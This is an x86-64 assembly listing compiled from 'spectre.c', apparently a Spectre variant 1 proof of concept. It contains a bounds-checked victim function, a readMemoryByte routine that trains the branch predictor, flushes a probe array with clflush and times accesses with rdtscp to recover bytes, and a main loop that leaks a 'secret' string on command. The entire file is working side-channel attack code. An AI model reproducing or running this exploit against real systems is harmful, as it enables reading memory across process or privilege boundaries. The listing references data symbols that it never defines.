	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	xorl	%eax, %eax
	cmpq	$16, %rdi
	setb	%al
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	cmpl	$0, (%rsi)
	je	.LBB1_2
# %bb.1:
	leaq	array1(%rip), %rax
	movzbl	(%rdi,%rax), %eax
	shlq	$9, %rax
	leaq	array2(%rip), %rcx
	movb	(%rax,%rcx), %al
	andb	%al, temp(%rip)
.LBB1_2:
	retq
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rdx, 16(%rsp)                  # 8-byte Spill
	movq	%rsi, 8(%rsp)                   # 8-byte Spill
	movq	%rdi, 24(%rsp)                  # 8-byte Spill
	leaq	readMemoryByte.results(%rip), %r14
	movl	$1024, %edx                     # imm = 0x400
	movq	%r14, %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %r12d                     # imm = 0x3E7
	leaq	array2(%rip), %r13
	movl	$2863311531, %ebp               # imm = 0xAAAAAAAB
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_25 Depth 3
                                        #     Child Loop BB2_9 Depth 2
                                        #     Child Loop BB2_14 Depth 2
	movq	%r14, %rbx
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	(%rax,%r13)
	addq	$512, %rax                      # imm = 0x200
	cmpq	$131072, %rax                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movq	%r12, 32(%rsp)                  # 8-byte Spill
                                        # kill: def $r12d killed $r12d killed $r12 def $r12
	andl	$15, %r12d
	movq	%r12, %r14
	xorq	24(%rsp), %r14                  # 8-byte Folded Reload
	movl	$29, %r15d
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_7:                                #   in Loop: Header=BB2_4 Depth=2
	leaq	x_is_safe_static(%rip), %rsi
	callq	victim_function
	movl	$0, x_is_safe_static(%rip)
	subl	$1, %r15d
	jb	.LBB2_8
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_25 Depth 3
	movl	%r15d, %eax
	imulq	%rbp, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r15d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r14, %rdi
	xorq	%r12, %rdi
	cmpq	$15, %rdi
	ja	.LBB2_6
# %bb.5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	$1, x_is_safe_static(%rip)
.LBB2_6:                                #   in Loop: Header=BB2_4 Depth=2
	clflush	x_is_safe_static(%rip)
	movl	$0, 4(%rsp)
	movl	4(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB2_7
	.p2align	4, 0x90
.LBB2_25:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 4(%rsp)
	movl	4(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB2_25
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_8:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$13, %edi
	movq	%rbx, %r14
	leaq	array1(%rip), %r8
	jmp	.LBB2_9
	.p2align	4, 0x90
.LBB2_12:                               #   in Loop: Header=BB2_9 Depth=2
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB2_13
.LBB2_9:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzbl	%dil, %ebp
	movq	%rbp, %rbx
	shlq	$9, %rbx
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbx,%r13), %eax
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$100, %rdx
	ja	.LBB2_12
# %bb.10:                               #   in Loop: Header=BB2_9 Depth=2
	cmpb	(%r12,%r8), %dil
	je	.LBB2_12
# %bb.11:                               #   in Loop: Header=BB2_9 Depth=2
	movl	%ebp, %eax
	addl	$1, (%r14,%rax,4)
	jmp	.LBB2_12
	.p2align	4, 0x90
.LBB2_13:                               #   in Loop: Header=BB2_1 Depth=1
	movl	$-1, %eax
	movq	%r14, %rdx
	xorl	%esi, %esi
	movl	$-1, %edi
	movq	32(%rsp), %r8                   # 8-byte Reload
	jmp	.LBB2_14
	.p2align	4, 0x90
.LBB2_15:                               #   in Loop: Header=BB2_14 Depth=2
	movl	%eax, %edi
	movl	%esi, %eax
.LBB2_20:                               #   in Loop: Header=BB2_14 Depth=2
	addq	$1, %rsi
	addq	$4, %rdx
	cmpq	$256, %rsi                      # imm = 0x100
	je	.LBB2_21
.LBB2_14:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%eax, %eax
	js	.LBB2_15
# %bb.16:                               #   in Loop: Header=BB2_14 Depth=2
	movl	(%rdx), %ebx
	movslq	%eax, %rbp
	cmpl	(%r14,%rbp,4), %ebx
	jge	.LBB2_15
# %bb.17:                               #   in Loop: Header=BB2_14 Depth=2
	testl	%edi, %edi
	js	.LBB2_19
# %bb.18:                               #   in Loop: Header=BB2_14 Depth=2
	movslq	%edi, %rbp
	cmpl	(%r14,%rbp,4), %ebx
	jl	.LBB2_20
.LBB2_19:                               #   in Loop: Header=BB2_14 Depth=2
	movl	%esi, %edi
	jmp	.LBB2_20
	.p2align	4, 0x90
.LBB2_21:                               #   in Loop: Header=BB2_1 Depth=1
	movslq	%eax, %rdx
	movl	(%r14,%rdx,4), %esi
	movslq	%edi, %rax
	movl	(%r14,%rax,4), %edi
	leal	(%rdi,%rdi), %ebp
	addl	$5, %ebp
	cmpl	%ebp, %esi
	movl	$2863311531, %ebp               # imm = 0xAAAAAAAB
	jge	.LBB2_24
# %bb.22:                               #   in Loop: Header=BB2_1 Depth=1
	xorl	$2, %esi
	orl	%edi, %esi
	je	.LBB2_24
# %bb.23:                               #   in Loop: Header=BB2_1 Depth=1
	leal	-1(%r8), %esi
	cmpl	$1, %r8d
	movl	%esi, %r12d
	ja	.LBB2_1
.LBB2_24:
	xorl	%ecx, readMemoryByte.results(%rip)
	leaq	readMemoryByte.results(%rip), %rcx
	movq	8(%rsp), %rdi                   # 8-byte Reload
	movb	%dl, (%rdi)
	movl	(%rcx,%rdx,4), %edx
	movq	16(%rsp), %rsi                  # 8-byte Reload
	movl	%edx, (%rsi)
	movb	%al, 1(%rdi)
	movl	(%rcx,%rax,4), %eax
	movl	%eax, 4(%rsi)
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rsi, 32(%rsp)                  # 8-byte Spill
	movl	%edi, 20(%rsp)                  # 4-byte Spill
	movq	stdin@GOTPCREL(%rip), %rbp
	leaq	.L.str.8(%rip), %r12
	leaq	.L.str.7(%rip), %r14
	leaq	.L.str.10(%rip), %rbx
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_1 Depth=1
	xorl	%eax, %eax
	callq	getpid@PLT
	leaq	.L.str.13(%rip), %rdi
	leaq	check+33(%rip), %rsi
	movl	%eax, %edx
	xorl	%eax, %eax
	callq	printf@PLT
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
	movq	(%rbp), %rdi
	callq	getc@PLT
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_12
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_13
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movq	%rdx, %rsi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	leaq	array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, 8(%rsp)
	callq	strlen@PLT
	movl	%eax, (%rsp)
	movl	$131072, %edx                   # imm = 0x20000
	leaq	array2(%rip), %rdi
	movl	$1, %esi
	callq	memset@PLT
	cmpl	$3, 20(%rsp)                    # 4-byte Folded Reload
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	movq	32(%rsp), %rbp                  # 8-byte Reload
	movq	8(%rbp), %rdi
	leaq	.L.str.2(%rip), %rsi
	leaq	8(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	leaq	array1(%rip), %rax
	subq	%rax, 8(%rsp)
	movq	16(%rbp), %rdi
	leaq	.L.str.3(%rip), %rsi
	movq	%rsp, %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	movq	8(%rsp), %rsi
	movl	(%rsp), %edx
	leaq	.L.str.4(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	movl	(%rsp), %esi
	leaq	.L.str.5(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, (%rsp)
	testl	%eax, %eax
	jle	.LBB3_11
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xorl	%r13d, %r13d
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_10:                               #   in Loop: Header=BB3_8 Depth=2
	movl	$10, %edi
	callq	putchar@PLT
	movl	(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, (%rsp)
	addq	$1, %r13
	testl	%eax, %eax
	jle	.LBB3_11
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movq	8(%rsp), %rsi
	movq	secret(%rip), %rax
	movsbl	(%rax,%r13), %edx
	leaq	.L.str.6(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	8(%rsp), %rdi
	leaq	1(%rdi), %rax
	movq	%rax, 8(%rsp)
	leaq	6(%rsp), %rsi
	leaq	24(%rsp), %rdx
	callq	readMemoryByte
	movl	24(%rsp), %r15d
	movl	28(%rsp), %ebp
	leal	(%rbp,%rbp), %eax
	cmpl	%eax, %r15d
	movq	%r12, %rsi
	leaq	.L.str.9(%rip), %rax
	cmovlq	%rax, %rsi
	movq	%r14, %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movzbl	6(%rsp), %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	movq	%rbx, %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%r15d, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	testl	%ebp, %ebp
	jle	.LBB3_10
# %bb.9:                                #   in Loop: Header=BB3_8 Depth=2
	movzbl	7(%rsp), %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	leaq	.L.str.11(%rip), %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%ebp, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	jmp	.LBB3_10
	.p2align	4, 0x90
.LBB3_11:                               #   in Loop: Header=BB3_1 Depth=1
	movq	stdin@GOTPCREL(%rip), %rbp
	jmp	.LBB3_1
.LBB3_13:
	xorl	%eax, %eax
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function